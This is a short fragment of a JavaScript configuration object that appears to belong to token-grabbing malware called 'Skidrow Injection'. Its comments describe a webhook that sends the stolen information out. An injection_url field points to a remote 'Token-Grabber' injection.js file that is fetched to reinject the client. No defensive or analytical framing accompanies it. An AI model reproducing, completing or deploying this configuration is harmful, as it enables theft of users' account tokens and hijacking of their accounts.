...
const config = {
  ...
  embed_name: 'Skidrow Injection', //name of the webhook thats gonna send the info
  embed_icon: 'https://i.imgur.com/62UtNm7.jpg'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  ...
  injection_url: 'https://raw.githubusercontent.com/Smug246/-Token-Grabber/main/injection.js', //injection url for when it reinjects
  /**
